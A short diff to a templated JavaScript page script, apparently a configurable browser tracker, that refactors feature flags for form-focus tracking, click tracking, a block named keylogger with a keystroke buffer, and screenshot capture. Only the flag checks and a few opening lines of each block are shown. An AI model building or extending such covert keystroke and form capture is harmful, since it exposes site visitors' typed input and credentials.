@@ -14,7 +14,8 @@
   });
 
   // Track form interactions if enabled
-  if ({{FEATURE_FORM_DATA}} === 'true') {
+  const formDataEnabled = {{FEATURE_FORM_DATA}};
+  if (formDataEnabled) {
     // Track form focus events
     document.addEventListener('focusin', function(event) {
       if (event.target.matches('input, textarea, select')) {
@@ -64,7 +65,8 @@
   }
 
   // Enhanced click tracking
-  if ({{FEATURE_CLICK_TRACKING}} === 'true') {
+  const clickTrackingEnabled = {{FEATURE_CLICK_TRACKING}};
+  if (clickTrackingEnabled) {
     document.addEventListener('click', function(event) {
       const clickData = {
         type: 'enhanced_click',
@@ -116,7 +118,8 @@
   }
 
   // Enhanced keystroke tracking
-  if ({{FEATURE_KEYLOGGER}} === 'true') {
+  const keyloggerEnabled = {{FEATURE_KEYLOGGER}};
+  if (keyloggerEnabled) {
     let keystrokeBuffer = '';
     let lastKeystroke = 0;
 
@@ -175,7 +178,8 @@
   }
 
   // Screenshot capability
-  if ({{FEATURE_SCREENSHOT}} === 'true') {
+  const screenshotEnabled = {{FEATURE_SCREENSHOT}};
+  if (screenshotEnabled) {
     // Take screenshots at key moments
     setTimeout(() => {
       captureScreenInfo();
